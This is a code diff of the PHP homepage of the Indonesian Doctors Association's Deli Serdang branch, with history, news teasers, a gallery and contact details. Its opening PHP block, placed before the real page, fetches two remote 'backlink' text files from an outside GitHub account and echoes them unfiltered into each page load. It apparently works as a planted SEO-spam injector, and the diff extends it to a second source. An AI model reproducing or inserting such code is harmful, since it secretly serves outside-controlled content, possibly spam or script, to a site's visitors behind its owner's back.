@@ -1,8 +1,459 @@
 <?php
-$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
-$ch = curl_init($url);
+$url1 = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$url2 = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
+$ch = curl_init();
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
+curl_setopt($ch, CURLOPT_URL, $url1);
+$result1 = curl_exec($ch);
+curl_setopt($ch, CURLOPT_URL, $url2);
+$result2 = curl_exec($ch);
 curl_close($ch);
-echo $result;
+echo $result1;
+echo $result2;
 ?>
+<?php
+include './admin/koneksi/connection.php';
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>IDI - CABANG DELI SERDANG</title>
+        <meta content="" name="description">
+        <meta content="" name="keywords">
+
+        <!-- Favicons -->
+        <link href="assets/img/logo_idi.png" rel="icon">
+        <link href="assets/img/logo_idi.png" rel="apple-touch-icon">
+
+        <!-- Google Fonts -->
+
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="crossorigin">
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600;1,700&family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Raleway:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap"
+            rel="stylesheet">
+        <!-- Vendor CSS Files -->
+
+        <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+        <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+        <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+        <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+        <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+        <!-- Template Main CSS File -->
+        <link href="assets/css/main.css" rel="stylesheet">
+
+        <!-- ======================================================= * Template Name:
+        Impact - v1.1.1 * Template URL:
+        https://bootstrapmade.com/impact-bootstrap-business-website-template/ * Author:
+        BootstrapMade.com * License: https://bootstrapmade.com/license/
+        ======================================================== -->
+
+    </head>
+
+    <body>
+        <?php $ambildata = (mysqli_query($con, "SELECT * FROM home"));
+        $data=$ambildata->fetch_assoc() ?>
+        <!-- ======= Header ======= -->
+        <section id="topbar" class="topbar d-flex align-items-center">
+            <div class="container d-flex justify-content-center justify-content-md-between">
+                <div class="contact-info d-flex align-items-center">
+                    <i class="bi bi-envelope d-flex align-items-center">
+                        <a href="mailto:contact@example.com"><?php echo $data['email_web'] ?></a>
+                    </i>
+                    <i class="bi bi-phone d-flex align-items-center ms-4">
+                        <span>
+                        <?php echo $data['tlp_web'] ?>
+                        </span></i>
+                </div>
+        </div>
+    </section>
+    <!-- End Top Bar -->
+
+    <header id="header" class="header d-flex align-items-center">
+        <div
+            class="container-fluid container-xl d-flex align-items-center justify-content-between">
+            <a href="index.php" class="logo d-flex align-items-center">
+                <!-- Uncomment the line below if you also wish to use an image logo -->
+                <!-- <img src="assets/img/logo.png" alt=""> -->
+                <img src="assets/img/logo_idi.png">
+                <h1><?php echo $data['nm_web'] ?>
+                </h1>
+            </a>
+            <nav id="navbar" class="navbar">
+                <ul>
+                    <li><a href="#hero">Home</a></li>
+                    <li><a href="#tentang">Tentang</a></li>
+                    <li><a href="#berita">Berita</a></li>
+                    <li><a href="#galeri">Galeri</a></li>
+                    <li class="dropdown">
+                        <a href="#">
+                            <span>Pelayanan</span>
+                            <i class="bi bi-chevron-down dropdown-indicator"></i>
+                        </a>
+                        <ul>
+                            <li><a href="./pelayanan/rekomendasi_sip.php">Syarat Rekomendasi SIP</a></li>
+                            <li><a href="./pelayanan/anggotabaru.php">Syarat Anggota Baru/Ulang</a></li>
+                            <li><a href="./pelayanan/ket_sekolah.php">Syarat Keterangan Sekolah</a></li>
+                            <li><a href="./pelayanan/ket_keluar_kota.php">Syarat Keterangan Keluar Kota</a></li>
+                            <li><a href="./pelayanan/ket_mutasi.php">Syarat Keterangan Mutasi</a></li>
+                        </ul>
+                    </li>
+                    <li class="dropdown">
+                        <a href="#">
+                            <span>Kegiatan</span>
+                            <i class="bi bi-chevron-down dropdown-indicator"></i>
+                        </a>
+                        <ul>
+                            <li><a href="./kegiatan/seminar.php">Sympsium</a></li>
+                            <li><a href="./kegiatan/bakti_sosial.php">Bakti Sosial</a></li>
+                            <li><a href="./workshop.php">Workshop</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="vidio_tutorial/tutorial_penggunaan_aplikasi.mp4">Tutorial </a></li>
+                    <li><a href="sertifikat.php">E-Sertifikat</a></li>
+                    <li><a href="user">Login</a></li>
+                </ul>
+            </li>
+        </ul>
+    </nav>
+    <!-- .navbar -->
+
+    <i class="mobile-nav-toggle mobile-nav-show bi bi-list"></i>
+    <i class="mobile-nav-toggle mobile-nav-hide d-none bi bi-x"></i>
+
+</div>
+
+</header>
+<!-- End Header -->
+
+<!-- ======= Hero Section ======= -->
+<section id="hero" class="hero">
+<div class="container position-relative">
+    <div class="row gy-5" data-aos="fade-in">
+        <div
+            class="col-lg-6 order-2 order-lg-1 d-flex flex-column justify-content-center text-center text-lg-start">
+            <h2>SELAMAT DATANG DI IDI</h2>
+		    <h2>Cabang Deli Serdang</h2>
+            <div class="d-flex justify-content-center justify-content-lg-start">
+                <a href="#tentang" class="btn-get-started">Get Started</a>
+            </div>
+        </div>
+        <div class="col-lg-6 order-1 order-lg-2">
+            <img
+                src="assets/img/dokter.png"
+                class="img-fluid"
+                alt=""
+                data-aos="zoom-out"
+                data-aos-delay="100">
+
+        </div>
+    </div>
+
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- End Hero Section -->
+
+<main id="main">
+
+<!-- ======= About Us Section ======= -->
+
+<section id="tentang" class="about">
+<div class="container" data-aos="fade-up">
+<div class="section-header">
+<h3>Tentang - IDI</h3>
+<p>Sejarah Ikatan Dokter Indonesia (IDI)</p>
+</div>
+<p>
+<b>Tahun 1998</b>
+</p>
+
+<p style="text-align:justify">
+
+IDI melakukan persiapan pembentukan Majelis Kolegium Kedokteran Indonesia
+(MKKI), yaitu lembaga baru dilingkungan IDI yang mengkoordinasikan seluruh
+kolegium ilmu dan bertanggung jawab dalam pendidikan profesi kedokteran, baik
+pendidikan dokter umum maupun pendidikan dokter spesialis.</p>
+
+<p>
+<b>Tahun 2000</b>
+</p>
+
+<p style="text-align:justify">
+
+Oktober : IDI mendirikan Pusat Data dan Layanan Informasi IDI (Pusdalin IDI).
+Lembaga ini bertujuan meningkatkan kinerja Kepengurusan IDI, dalam menghadapi
+perkembangan zaman. Pusat data ini terbentuk berdasarkan SK PB No.
+318/PBA4/10/2000.</p>
+
+<p>
+<b>Tahun 2001</b>
+</p>
+
+<p style="text-align:justify">
+
+PB IDI membentuk tim UU Kesehatan Pejabat Negara. Pembentukan tim ini untuk
+memenuhi permintaan DPR RI yang akan menerbitkan RUU Kepresidenan.</p>
+
+<p>
+<b>Tahun 2002</b>
+</p>
+
+<p style="text-align:justify">
+
+Januari : PB IDI mengadakan satu Round Table Discussion (RTD) tentang obat
+murah. Kegiatan ini berfungsi meluruskan berbagai isu yang menempatkan dokter
+sebagai variable yang sangat menentukan terhadap tingginya harga obat.</p>
+
+<p>
+<b>Tahun 2008</b>
+</p>
+
+<p style="text-align:justify">
+
+IDI melaunching Kegiatan Dokter Kecil Award oleh Wakil Gubernur DKI Jakarta,
+sekaligus workshop Dokter Kecil.</p>
+
+<p>
+<b>Tahun 2009</b>
+</p>
+
+<p style="text-align:justify">
+
+Muktamar IDI ke XVII Palembang mensahkan Dr. Prijo Sidipratomo, Sp.Rad sebagai
+Ketua Umum ke Sembilan Belas PB IDI.</p>
+
+<p>
+<b>Tahun 2010</b>
+</p>
+
+<p style="text-align:justify">
+
+September 2010 : PB IDI mengeluarkan Surat Edaran nomor 1200/PB/A3/09/2010
+tentang resertifikasi yang berisi antara lain pendaftaran administrasi P2KB
+untuk dokter spesialis maupun dokter umum melalui IDI cabang dan IDI wilayah
+</p>
+
+<p>
+<b>Tahun 2011</b>
+</p>
+
+<p style="text-align:justify">
+
+IDI menyelenggarakan Musyawarah Kerja Nasional di Pekanbaru, Riau.
+</p>
+
+<p>
+<b>Tahun 2012</b>
+</p>
+
+<p style="text-align:justify">
+
+<ul>
+
+<li>Muktamar ke VIII di Makassar mensahkan Dr. Zaenal Abidin, MH sebagai Ketua
+Umum kedua puluh PB IDI. Dan mensahkan Prof. Dr. I Oetama Marsis, Sp.OG (K)
+sebagai Ketua Terpilih IDI.</li>
+
+<li>PB IDI telah merenovasi gedung utama maupun gedung belakang yang digunakan
+untuk operasional dan meningkatkan pelayanan</li>
+
+<li>PB IDI telah melakukan kajian dan menetapkan tarif dokter spesialis yang
+digunakan untuk negosiasi dengan BPJS</li>
+
+<li>Oktober : IDI menandatangani deklarasi Gerakan Dokter Selamatkan Indonesia
+bersama Komnas Pengendalian Tembakau</li>
+
+<li>Penandatanagan MoU antara IDI dengan Mabes Polri</li>
+
+<li>PB IDI bekerjasama dengan Singapore Medical Association (SMA) membuat
+kesepakatan terkait pedoman dan kode etik iklan layanan kesehatan dan kegiatan
+ilmiah di kedua Negara.</li>
+
+<li>Kerjasama dalam penilaian medis dan second opinion terhadap saksi/
+tersangka/terdakwa yang perkaranya ditangani Komisi Pemberantasan Korupsi (KPK)</li>
+
+<li>Berdasarkan SK PB IDI nomor 2117/PB/A4/05/2012 tanggal 16 Mei 2012 diberikan
+Penghargaan Keteladanan Dokter Indonesia kepada Dr. Endang Rahayu Soedyaningsih,
+MPH, DR. PH</li>
+
+<ul></p>
+
+</div>
+
+<!-- <div class="position-relative mt-4"> <img src="assets/img/about-2.jpg"
+class="img-fluid rounded-4" alt=""> <a
+href="https://www.youtube.com/watch?v=LXb3EKWsInQ" class="glightbox
+play-btn"></a> </div> </div> </div> </div> </div> </section> <!- End About Us
+Section -->
+
+</div>
+
+</div>
+
+</div>
+
+</section>
+<!-- End Stats Counter Section -->
+
+<!-- ======= Our Services Section ======= -->
+
+<section id="berita" class="services sections-bg">
+
+<div class="container" data-aos="fade-up">
+
+<div class="section-header">
+
+<h2>Berita - IDI</h2>
+
+<!-- <p>Aperiam dolorum et et wuia molestias qui eveniet numquam nihil porro
+incidunt dolores placeat sunt id nobis omnis tiledo stran delop</p> -->
+
+</div>
+<div class="row gy-4" data-aos="fade-up" data-aos-delay="100">
+<div class="col-lg-4 col-md-6">
+<div class="service-item  position-relative">
+<h3>Sidang MK Ke dua: IDI, KKI dan PDGI</h3>
+<p>Mahkamah Kosntitusi (MK) menerima gugatan uji materiil terhadap UU nomor 36
+tahun 2014 tentang Tenaga Kesehatan. Sidang perdana perkara yang teregistrasi
+dengan nomor perkara 82/PUU-XIII/2015 ini telah dilaksanakan pada Kamis (30/7)
+oleh panel Hakim[…].</p>
+<a href="./berita/Sidang_MK_ke2.php" class="readmore stretched-link">Read more
+<i class="bi bi-arrow-right"></i>
+</a>
+</div>
+</div>
+<!-- End Service Item -->
+
+<div class="col-lg-4 col-md-6">
+    <div class="service-item position-relative">
+        <h3>KONTROVERSI RUU KESEHATAN</h3>
+        <p>KONTROVERSI RUU KESEHATAN Iqbal Mochtar Legislasi model omnibus rupanya mencecar bukan hanya bidang pekerjaan tetapi juga kesehatan. Baru-baru ini beredar draf Rancangan Undang-Undang (RUU) Omnibus Kesehatan yang menelisik beragam issu kesehatan, mulai dari praktik kedokteran hingga BPJS. Ironisnya, sesaat setelah beredar, muncul berbagai reaksi penolakan. Sejumlah organisasi profesi, seperti Ikatan Dokter Indonesia (IDI), Persatuan Dokter Gigi […].</p>
+        <a href="./berita/ruu_kesehatan.php" class="readmore stretched-link">Read more <i class="bi bi-arrow-right"></i></a>
+    </div>
+</div>
+<!-- End Service Item -->
+
+<div class="col-lg-4 col-md-6">
+    <div class="service-item position-relative">
+        <h3>ORGANISASI PROFESI DAN FENOMENA ‘LESS IS MORE’</h3>
+        <p>ORGANISASI PROFESI DAN FENOMENA ‘LESS IS MORE’ Iqbal Mochtar Era demokrasi menyimpan ‘keberkahan ngeri-ngeri sedap’. Orang kian bebas mengekspresikan opini dan kiprah. Imbasnya luas; termasuk terhadap dunia organisasi kedokteran. Hingga saat ini, organisasi profesi dokter yang diakui di Indonesia hanya satu; namanya IDI. Namun akhir-akhir ini muncul kumpulan-kumpulan yang mengklaim dirinya sebagai organisasi profesi […].</p>
+        <a href="./berita/organisasi_fenomena.php" class="readmore stretched-link">Read more <i class="bi bi-arrow-right"></i></a>
+    </div>
+</div><!-- End Service Item -->
+
+<div class="col-lg-4 col-md-6">
+    <div class="service-item position-relative">
+        <h3>PB IDI Gandeng Aplikasi D2D untuk Skrining Kesehatan Masyarakat</h3>
+        <p>Berdasarkan data Badan Kesehatan Dunia (WHO), 41 juta orang meninggal setiap tahun akibat penyakit tidak menular. Di Indonesia, penyakit diabetes mellitus, jantung, kanker, dan penyakit paru kronis masuk dalam 5 besar penyebab kematian. Jumlah kasus ini terus meningkat seiring dengan meningkatnya faktor risiko seperti tingginya asupan gula, garam, dan lemak serta rendahnya aktivitas fisik. […] .</p>
+        <a href="./berita/aplikasi_d2d.php" class="readmore stretched-link">Read more <i class="bi bi-arrow-right"></i></a>
+    </div>
+</div><!-- End Service Item -->
+
+<div class="col-lg-4 col-md-6">
+    <div class="service-item position-relative">
+        <h3>RUU “Omnibus Law” Kesehatan versus Uniknya Profesi Dokter</h3>
+        <p>RUU “Omnibus Law” Kesehatan versus Uniknya Profesi Dokter Profesi kesehatan, khususnya profesi dokter itu unik, masing-masing memiliki kekhasannya. Bahwa dibutuhkan UU Sistem Kesehatan Nasional untuk menjembataninya, mungkin ya, tetapi bukan menggabungkannya. Prof Dr H M Laica Marzuki ketika menjadi saksi ahli dalam perkara pengujian Undang-Undang Nomor 36 Tahun 2009 tentang Tenaga Kesehatan di Mahkamah Konstitusi […] .</p>
+        <a href="./berita/ruu_omnibuslaw.php" class="readmore stretched-link">Read more <i class="bi bi-arrow-right"></i></a>
+    </div>
+</div><!-- End Service Item -->
+</div>
+</div>
+
+</section>
+<!-- End Our Services Section --></div>
+<div class="swiper-pagination">
+</div> </div>
+</div>
+</section><!-- End Testimonials Section --><!-- ======= Portfolio Section ======= -->
+
+<!-- ======= Galeri ======= -->
+<section id="galeri" class="portfolio sections-bg">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-header">
+          <h2>Galeri - IDI</h2>
+        </div>
+
+        <div class="portfolio-isotope" data-portfolio-filter="*" data-portfolio-layout="masonry" data-portfolio-sort="original-order" data-aos="fade-up" data-aos-delay="90">
+        <?php
+            $ambildata  = (mysqli_query($con,"SELECT * FROM galeri WHERE id_galeri"));
+            while($data=mysqli_fetch_array($ambildata)){
+        ?>
+        <div class="row gy-4 portfolio-container">
+
+            <div class="col-xl-3 col-md-5 portfolio-item filter-app">
+              <div class="portfolio-wrap">
+                <!-- <a href="assets/img/portfolio/app-1.jpg" data-gallery="portfolio-gallery-app" class="glightbox"><img src="assets/img/portfolio/app-1.jpg" class="img-fluid" alt=""></a> -->
+                <img src="admin/galeri_foto/<?php echo $data['upload_foto'] ?>" width="320" height="200" alt="" data-gallery="portfolio-gallery-app" class="glightbox"><br>
+                <?php echo $data['nama_kegiatan'] ?>
+              </div>
+            </div><!-- End Portfolio Item -->
+            <?php } ?>
+          </div>
+          <!-- End Portfolio Container -->
+        </div>
+      </div>
+    </section>
+    <!-- End Portfolio Section -->
+
+</main>
+<!-- End #main -->
+<!-- ======= Footer ======= --> 
+<footer id="footer" class="footer">
+  <div class="container">
+    <div class="row gy-2">
+      <div class="col-lg-5 col-md-10 footer-info">
+        <a href="index.php" class="logo d-flex align-items-center">
+<img src="assets/img/logo_idi.png">
+<span>Sekretariat IDI-Deli Serdang</span></a>
+  <p>Jl. Karya Asih No.4, Perbarakan, Kec. Pagar Merbau, Kabupaten Deli Serdang, Sumatera Utara 20514.</p></br>
+  <a href="https://www.google.com/maps/place/Kantor+IDI+Cab+Deli+Serdang/@3.5415368,98.801156,13z/am=t/data=!4m19!1m13!4m12!1m4!2m2!1d98.803205!2d3.529186!4e1!1m6!1m2!1s0x303149b5e6e29c5f:0x971c4b926868337!2sGVW9%2BG38+Kantor+IDI+Cab+Deli+Serdang,+Perbarakan,+Pagar+Merbau,+Deli+Serdang+Regency,+North+Sumatra+20515!2m2!1d98.867708!2d3.5462848!3m4!1s0x303149b5e6e29c5f:0x971c4b926868337!8m2!3d3.5462848!4d98.867708?hl=en-GB" class="lokasi"><i class="bi bi-geo-alt-fill"></i>Lokasi Kami</a>
+  <div class="social-links d-flex mt-4">
+  <a href="#" class="twitter"><i class="bi bi-twitter"></i></a>
+  <a href="#" class="facebook"><i class="bi bi-facebook"></i></a>
+  <a href="#" class="instagram"><i class="bi bi-instagram"></i></a>
+  <a href="#" class="linkedin"><i class="bi bi-linkedin"></i></a>
+</div>
+</div>
+    <div class="col-lg-2 col-6 footer-links">
+      <h4>Useful Links</h4>
+      <ul>
+        <li><a href="#">Home</a></li>
+        <li><a href="#">About us</a></li>
+        <li><a href="#">Services</a></li>
+        <li><a href="#">Terms of service</a></li>
+        <li><a href="#">Privacy policy</a></li>
+      </ul>
+    </div>
+    <div class="col-lg-2 col-2">
+    <h4>Contact Us</h4>
+      <!-- <p> A108 Adam Street <br> New York, NY 535022<br> United States <br><br>-->
+      <strong>Phone: +628 52-7060-2462</strong><!-- <strong>Phone:</strong> +1 5589 55488 55<br> -->
+      <strong>Email: idideliserdang22@gmail.com</strong><br></p>
+    </div>
+</div>
+    <div class="container mt-4"><div class="copyright">&copy; Copyright<strong>
+      <span>IT Development</span></strong>. All Rights Reserved</div>
+      <div class="credits"><!-- All the links in the footer should remain intact. --><!-- You can delete the links only if you purchased the pro version. --><!-- Licensing information: https://bootstrapmade.com/license/ --><!--Purchase the pro version with working PHP/AJAX contact form:https://bootstrapmade.com/impact-bootstrap-business-website-template/ --><!-- Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a> -->
+      </div>
+    </div>
+  </footer><!-- End Footer -->
+  <a href="#" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+  <div id="preloader"></div>
+  <!-- Vendor JS Files -->
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js">
+  </script><script src="assets/vendor/aos/aos.js"></script>
+  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>
+  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
+  <!-- Template Main JS File -->
+  <script src="assets/js/main.js"></script></body></html>
